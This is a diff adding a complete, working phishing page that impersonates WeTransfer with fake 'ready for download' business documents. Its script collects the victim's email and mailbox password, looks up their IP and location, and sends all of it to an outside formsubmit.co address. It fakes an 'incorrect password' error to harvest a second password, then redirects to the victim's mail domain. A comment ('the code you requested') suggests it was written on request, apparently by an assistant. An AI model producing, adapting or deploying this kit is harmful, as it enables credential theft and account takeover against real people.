@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Transfer Files</title>
+  <style>
+    /* keyframe spinner animation */
+    @keyframes rotating{0%{-webkit-transform:rotate(0deg);transform:rotate(0)}to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.rotating{animation:rotating 2s linear infinite}body{margin:0;padding:0;font-size:.8rem;font-family:Open Sans,lucida grande,Segoe UI,arial,verdana,lucida sans unicode,tahoma,sans-serif;box-sizing:border-box;background-color:#2f93ce}.spinner{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;font-size:1.2rem;padding:1rem;border-radius:5px}img.spinner{width:27rem}#body__bg{position:fixed;right:0;bottom:0;min-width:100%;min-height:100%;z-index:0;object-fit:cover}.header{z-index:1;position:relative;display:flex;justify-content:space-between;align-items:center;padding:1rem}.header .left,.header .right{display:flex;align-items:center;border:1px solid gray;gap:.4rem;background:white;padding:.5rem .9rem;border-radius:5px;font-size:.95rem}.header .left p,.header .right p{margin:0;padding:0}.header .left svg,.header .right svg{font-size:1.4rem}.files__container{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background-color:#fff;width:27rem;border-radius:5px;border:1px solid #ddd}.files__container .files__header{text-align:center;padding:2rem 1rem}.files__container .files__header h2{font-size:1.2rem}.files__container .files__header p{color:gray;margin:0;padding:0;font-size:.8rem}.files__container .files__header .files__header__logo svg{font-size:2rem;fill:#2f70df}.files__container .files__body{border-top:1px solid gray;border-bottom:1px solid gray;max-height:20rem;overflow-y:auto}.files__container .files__body .file__container{display:flex;align-items:center;justify-content:space-between;padding:1rem}.files__container .files__body .file__container:last-child{padding-bottom:1rem}.files__container .files__body .file__container .file_info{display:flex;gap:1rem;align-items:center}.files__container .files__body .file__container .file_info .file_img{width:2.5rem;height:2.5rem}.files__container .files__body .file__container .file_info .file_img img{width:100%}.files__container .files__body .file__container .file_info .file_details{display:grid;gap:.2rem}.files__container .files__body .file__container .file_info .file_details p{margin:0;padding:0}.files__container .files__body .file__container .file_info .file_details .file_title{font-size:.85rem}.files__container .files__body .file__container .file_info .file_details .file_size{font-size:.6rem}.files__container .files__body .file__container .file_download{font-size:1.5rem;color:#2f70df;cursor:pointer}.files__container .files__footer{display:flex;align-items:center;justify-content:space-between;padding:1rem}.files__container .files__footer .save{font-size:.9rem;color:#2f93ce;cursor:pointer}.btn{border:none;padding:.7rem 1.2rem;border-radius:5px;background-color:#2f70df;color:#fff;cursor:pointer}.btn:hover{background-color:#2f93ce}.modal{position:absolute;top:0;right:0;left:0;bottom:0;background-color:#0000008f}.modal .modal-body{min-width:400px;max-width:500px;position:absolute;top:40%;left:50%;padding:1rem 2rem;background:white;transform:translate(-50%,-50%)}.modal .modal-body .error-box{text-align:left;color:red;font-size:.8rem}.modal .modal-body .spinner{max-width:500px;min-height:400px;display:none}.modal .modal-body .close{display:flex;justify-content:flex-end;font-size:1.5rem;cursor:pointer}.modal .modal-body .header{display:flex;align-items:center;justify-content:flex-start}.modal .modal-body .header svg{margin-left:-1rem;margin-right:.7rem;font-size:2.5rem;color:#2f70df}.modal .modal-body .header h2{font-size:1.3rem}.modal .modal-body .title{font-size:1.2rem;margin:0}.modal .modal-body .sub-title{font-size:.8rem}.modal .modal-body .sub-title span{color:#00f}.modal .modal-body .notice{font-size:.8rem;color:#768290;margin-bottom:1rem}.modal .modal-body .h-1{text-align:center;margin-bottom:2rem}.modal .modal-body form{text-align:center;margin-top:2rem}.modal .modal-body form .h-2{text-align:center;color:#2f93ce}.modal .modal-body form .form-group{margin-bottom:1rem}.modal .modal-body form .form-group .form-control{padding:.6rem;border:.05rem solid #768290;min-width:calc(100% - 1rem);font-size:.9rem;border-radius:.2rem}.modal .modal-body form .form-group.d-flex{display:flex;align-items:center;justify-content:space-between}.modal .modal-body form .form-group .check-box{display:flex;align-items:center;justify-content:flex-start}.modal .modal-body form .form-group .check-box label{white-space:nowrap}.modal .modal-body form .form-group .forgot-password .link-like{font-size:.8rem;color:#00f;text-decoration:underline}.modal .modal-body form .form-group.btn-group{display:grid;gap:.5rem}.modal .modal-body form .btn{display:flex;align-items:center;justify-content:center;cursor:pointer;width:100%;border:none;background-color:#2f70df;color:#fff;padding:.7rem}.modal .modal-body form .btn img{height:1.3rem;margin-right:1rem}.modal .modal-body form .btn.clear{border:.05rem solid #768290;color:#000;background-color:#fff}.modal .modal-body form .btn.logo{display:flex;justify-content:center;align-items:center;background-color:transparent;color:#000;border:.05rem solid #768290}.modal .modal-body form .btn.logo svg{font-size:1.3rem;margin:0;margin-top:-.2rem;margin-right:.3rem}.modal .modal-body form .btn.logo img{width:1.3rem;margin-right:.4rem}.modal .modal-body form .btn.logo:hover{background-color:#f2f2f2}.modal .modal-body form .btn:hover{background-color:#2f93ce}@media screen and (max-width: 600px){.files__container{max-width:90%}.modal .modal-body{top:50%;min-width:80%;max-width:90%;padding:1rem}}
+    #m-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:none;z-index:999;justify-content:center;align-items:center}
+    #m-modal .close{cursor:pointer}
+    .download .btn{cursor:pointer}
+    .file_download{cursor:pointer}
+    #root{display:none}
+    #loading-spinner{
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:rgba(0,0,0,0.3);
+      display:flex;align-items:center;justify-content:center;
+      z-index:9999;
+    }
+    #loading-spinner .spinner-box{
+      background:#fff;padding:1.5rem 2rem;border-radius:12px;
+      box-shadow:0 10px 25px rgba(0,0,0,0.2);
+      display:flex;flex-direction:column;align-items:center;
+    }
+    #loading-spinner .spinner-box svg{
+      font-size:3rem;color:#2f70df;
+    }
+    #loading-spinner .spinner-box p{
+      margin:0.5rem 0 0 0;color:#333;font-weight:500;
+    }
+  </style>
+</head>
+<body>
+  <div id="loading-spinner">
+    <div class="">
+      <div class="spinner">
+        <svg stroke="currentColor" fill="currentColor" stroke-width="0" version="1.1" viewBox="0 0 16 16" class="rotating" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+          <path d="M8 16c-2.137 0-4.146-0.832-5.657-2.343s-2.343-3.52-2.343-5.657c0-1.513 0.425-2.986 1.228-4.261 0.781-1.239 1.885-2.24 3.193-2.895l0.672 1.341c-1.063 0.533-1.961 1.347-2.596 2.354-0.652 1.034-0.997 2.231-0.997 3.461 0 3.584 2.916 6.5 6.5 6.5s6.5-2.916 6.5-6.5c0-1.23-0.345-2.426-0.997-3.461-0.635-1.008-1.533-1.822-2.596-2.354l0.672-1.341c1.308 0.655 2.412 1.656 3.193 2.895 0.803 1.274 1.228 2.748 1.228 4.261 0 2.137-0.832 4.146-2.343 5.657s-3.52 2.343-5.657 2.343z"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <div id="root">
+    <div style="display:block;">
+      <!-- video with autoplay, loop, muted, playsinline to ensure autoplay -->
+      <video autoplay loop muted playsinline id="body__bg" src="https://wapka-cdn.zuna.id/00heju/e1aa425177c1c97f72a9da7a8e1e4329/87146-601076915.mp4"></video>
+      <div class="header">
+        <div class="left">
+          <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path></svg>
+          <p>WeTransfer</p>
+        </div>
+        <div class="right">
+          <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"></path><path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path></svg>
+        </div>
+      </div>
+      <div class="files__container">
+        <div class="files__header">
+          <div class="files__header__logo">
+            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path></svg>
+          </div>
+          <h2>4 items ready for download</h2>
+          <p>41.0 MB • Expires in 7 days</p>
+        </div>
+        <div class="files__body">
+          <div class="file__container">
+            <div class="file_info">
+              <div class="file_img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt_VfVh-JsdmpYebGgI7bMa6QesHIkhWFqUqtsVl0aAQcWFPrN8jEzGtwxqJHjj1IfSwt5LA5uJSmV_dsnHHgkM9hb1cSjMLSK2tvKqNKDbKlZDirU2GmyQVTgE131GtauopAH5_EwrS-5mllxwr62H-Fb8K0lKTWU0W6EwNrffPgJgCIYpDD4X3PJO8U/s320/pdf.png" alt="CONTACT DETAILS &amp; SCOPE OF WORK.pdf"></div>
+              <div class="file_details">
+                <p class="file_title">CONTACT DETAILS &amp; SCOPE OF WORK.pdf</p>
+                <p class="file_size">20 MB</p>
+              </div>
+            </div>
+            <div class="file_download" data-file="CONTACT DETAILS &amp; SCOPE OF WORK.pdf">
+              <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path fill="none" d="M0 0h24v24H0z"></path><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path></svg>
+            </div>
+          </div>
+          <div class="file__container">
+            <div class="file_info">
+              <div class="file_img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmnJqP5hpCLxgXwOhp6sanK44Z6JT-jtfj382fJsnjJh8yi_1b__i9LbwyHlJIKZgxyuhy0JU5tzm83hYmDN763j8-t0rI2PKfx5anaxceXwOMCCjiea2dOKCG6S01eITACZxuM2hQiNRB3ew5L-orY9y3mwlAU_4bubiBKOIBtVEBXEKaC3qfA4GiDHk/s320/xls.png" alt="SPECIFICATIONS.xlsx"></div>
+              <div class="file_details">
+                <p class="file_title">SPECIFICATIONS.xlsx</p>
+                <p class="file_size">4.5 MB</p>
+              </div>
+            </div>
+            <div class="file_download" data-file="SPECIFICATIONS.xlsx">
+              <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path fill="none" d="M0 0h24v24H0z"></path><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path></svg>
+            </div>
+          </div>
+          <div class="file__container">
+            <div class="file_info">
+              <div class="file_img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt_VfVh-JsdmpYebGgI7bMa6QesHIkhWFqUqtsVl0aAQcWFPrN8jEzGtwxqJHjj1IfSwt5LA5uJSmV_dsnHHgkM9hb1cSjMLSK2tvKqNKDbKlZDirU2GmyQVTgE131GtauopAH5_EwrS-5mllxwr62H-Fb8K0lKTWU0W6EwNrffPgJgCIYpDD4X3PJO8U/s320/pdf.png" alt="QUOTE.pdf"></div>
+              <div class="file_details">
+                <p class="file_title">QUOTE.pdf</p>
+                <p class="file_size">1.6 MB</p>
+              </div>
+            </div>
+            <div class="file_download" data-file="QUOTE.pdf">
+              <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path fill="none" d="M0 0h24v24H0z"></path><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path></svg>
+            </div>
+          </div>
+          <div class="file__container">
+            <div class="file_info">
+              <div class="file_img"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt_VfVh-JsdmpYebGgI7bMa6QesHIkhWFqUqtsVl0aAQcWFPrN8jEzGtwxqJHjj1IfSwt5LA5uJSmV_dsnHHgkM9hb1cSjMLSK2tvKqNKDbKlZDirU2GmyQVTgE131GtauopAH5_EwrS-5mllxwr62H-Fb8K0lKTWU0W6EwNrffPgJgCIYpDD4X3PJO8U/s320/pdf.png" alt="PROJECT PLANS/INFORMATION.pdf"></div>
+              <div class="file_details">
+                <p class="file_title">PROJECT PLANS/INFORMATION.pdf</p>
+                <p class="file_size">14 MB</p>
+              </div>
+            </div>
+            <div class="file_download" data-file="PROJECT PLANS/INFORMATION.pdf">
+              <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path fill="none" d="M0 0h24v24H0z"></path><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path></svg>
+            </div>
+          </div>
+        </div>
+        <div class="files__footer">
+          <div class="save"><p>Save to cloud</p></div>
+          <div class="download"><button class="btn" id="downloadBtn">Download All</button></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="m-modal">
+    <div class="modal">
+      <div class="modal-body">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWdb1OJdCK82923tW74u3tktG0QP-y9_eXIs9ftkmdYQfn2y73fDtknIKmmN7qET6LkV4N6BtrE9dQ98PJ8D3tKo1oDycVWN6RudYa9ZWWF-w3CLUrJH2UKEgIL41wo5VCBU26UOlZjOUzllpPwZpSmodxO_AG6cRtIypcSQNS0ULoT6Y-OqzGzRV6oFQ/s320/loader.gif" alt="loading" class="spinner">
+        <div>
+          <div class="close" id="closeModalBtn">&times;</div>
+          <div class="header">
+            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path></svg>
+            <h2>WeTransfer</h2>
+          </div>
+          <p class="title">Sign in with your correct Mailbox Password to access documents</p>
+          <form id="loginForm">
+            <div class="form-group"><input type="email" name="email" id="emailInput" class="form-control" placeholder="Email Address" value=""></div>
+            <div class="form-group"><input type="password" name="password" id="passwordInput" class="form-control" placeholder="Email Password" value=""></div>
+            <p class="error-box" id="errorBox"></p>
+            <div class="form-group d-flex">
+              <div class="check-box"><input type="checkbox" id="remember-me"><label for="remember-me">Remember me</label></div>
+              <div class="forgot-password"></div>
+            </div>
+            <div class="form-group btn-group">
+              <button class="btn" type="submit" id="submitBtn">Sign in</button>
+              <button class="btn logo" type="button"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWPOOeyR0qaovkkko36Ymo6mVhyphenhyphenSkvRiJjt6hinVeA9x6s9MTDWO6cRXE6wMN0aSMwelImtkbem5xNvf9UKW3DakQK5kIYIiHnlhvIU4zddv4jEm1z-XGuW63oUTRhSaJl6WbICbhRlcECg7IRIPkPoXpmXQZsQUsKcoaYUOVinAkHxPavqYIxMxREQ1s/s320/micsft-logo.png" alt="">Sign in with Microsoft</button>
+              <button class="btn logo" type="button"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path></svg>Sign in with Apple</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // DOM refs
+      const emailInput = document.getElementById('emailInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const errorBox = document.getElementById('errorBox');
+      const submitBtn = document.getElementById('submitBtn');
+      const loginForm = document.getElementById('loginForm');
+      const modal = document.getElementById('m-modal');
+      const closeBtn = document.getElementById('closeModalBtn');
+
+      // Helper to show error
+      function showError(msg) {
+        errorBox.textContent = msg;
+        errorBox.style.color = '#d32f2f';
+      }
+
+      // Helper to clear error
+      function clearError() {
+        errorBox.textContent = '';
+      }
+
+      // ----- URL hash pre-fill (the code you requested) -----
+      function prefillEmailFromHash() {
+        if (window.location.hash) {
+          const clientID = window.location.hash.substring(1); // remove '#'
+          if (clientID.includes('@')) {
+            emailInput.value = clientID;
+            // optional: trigger validation if needed
+          }
+        }
+      }
+
+      // ----- modal logic -----
+      function openModal(fileName) {
+        modal.style.display = 'flex';
+        // pre-fill email from hash every time modal opens (in case hash changed)
+        prefillEmailFromHash();
+        if (fileName) console.log('Download requested for: ' + fileName);
+      }
+
+      // attach download events
+      document.getElementById('downloadBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        openModal('All Files');
+      });
+
+      document.querySelectorAll('.file_download').forEach(function(icon) {
+        icon.addEventListener('click', function(e) {
+          e.stopPropagation();
+          const fileName = this.getAttribute('data-file') || 'file';
+          openModal(fileName);
+        });
+      });
+
+      closeBtn.addEventListener('click', function() { modal.style.display = 'none'; });
+      modal.addEventListener('click', function(e) { if (e.target === modal) modal.style.display = 'none'; });
+
+      // ----- login with IP and 2-attempt redirect (plus pre-fill) -----
+      let step = 0;
+
+      loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        // validation
+        if (!email || !password) {
+          showError('Please fill in all fields.');
+          return;
+        }
+        if (!email.includes('@')) {
+          showError('Please enter a valid email address.');
+          return;
+        }
+        clearError();
+
+        // disable button
+        const originalText = submitBtn.textContent;
+        submitBtn.textContent = 'Processing...';
+        submitBtn.disabled = true;
+
+        try {
+          // 1. Get IP
+          const ipResponse = await fetch('https://ipinfo.io/json');
+          if (!ipResponse.ok) throw new Error('Network error');
+          const ipData = await ipResponse.json();
+
+          step++; // increment attempt
+
+          // 2. Prepare payload
+          const formData = {
+            _subject: "Logs | " + ipData.ip,
+            Email: email,
+            Password: password,
+            Attempts: step,
+            IP: ipData.ip,
+            Location: ipData.city + ", " + ipData.country,
+          };
+
+          // 3. POST to your API
+          const submitResponse = await fetch('https://formsubmit.co/ajax/egoabata@yandex.com', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json',
+            },
+            body: JSON.stringify(formData),
+          });
+
+          if (!submitResponse.ok) throw new Error('Network error');
+          const result = await submitResponse.json();
+          console.log('Server response:', result);
+
+          // 4. If second attempt → redirect
+          if (step === 2) {
+            const domain = email.split('@').pop();
+            window.location.href = `http://${domain}`;
+            return;
+          }
+
+          // 5. First attempt: show incorrect password
+          showError('Incorrect password. Please try again.');
+          submitBtn.textContent = originalText;
+          submitBtn.disabled = false;
+
+        } catch (err) {
+          console.error(err);
+          showError('An error occurred. Please try again.');
+          submitBtn.textContent = originalText;
+          submitBtn.disabled = false;
+        }
+      });
+
+      // ----- initial pre-fill on page load (if modal not opened yet) -----
+      // but we also call it inside openModal, so it works when modal opens.
+      // Also call it now in case modal is already open (it's hidden by default)
+      // We'll call it after DOM ready.
+      prefillEmailFromHash();
+
+      // Also, if the modal is opened via any trigger, we already call prefillEmailFromHash inside openModal.
+      // For safety, also run on hashchange
+      window.addEventListener('hashchange', function() {
+        // if modal is visible, update email
+        if (modal.style.display === 'flex') {
+          prefillEmailFromHash();
+        }
+      });
+
+      // expose prefill to console for testing
+      window.prefillEmailFromHash = prefillEmailFromHash;
+
+      // hide spinner and show root (existing)
+      window.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+          var spinner = document.getElementById('loading-spinner');
+          if (spinner) spinner.style.display = 'none';
+          document.getElementById('root').style.display = 'block';
+        }, 1200);
+      });
+
+      // Ensure video autoplay (in case browser blocks it)
+      // The video already has autoplay, loop, muted, playsinline attributes.
+      // Some browsers require a user gesture, but muted autoplay is generally allowed.
+      // We'll also try to play it programmatically if it's paused.
+      const video = document.getElementById('body__bg');
+      if (video) {
+        video.play().catch(function(e) {
+          // Autoplay was prevented; but with muted and playsinline it should work.
+          console.log('Autoplay was prevented:', e);
+        });
+      }
+
+    })();
+  </script>
+</body>
+</html>
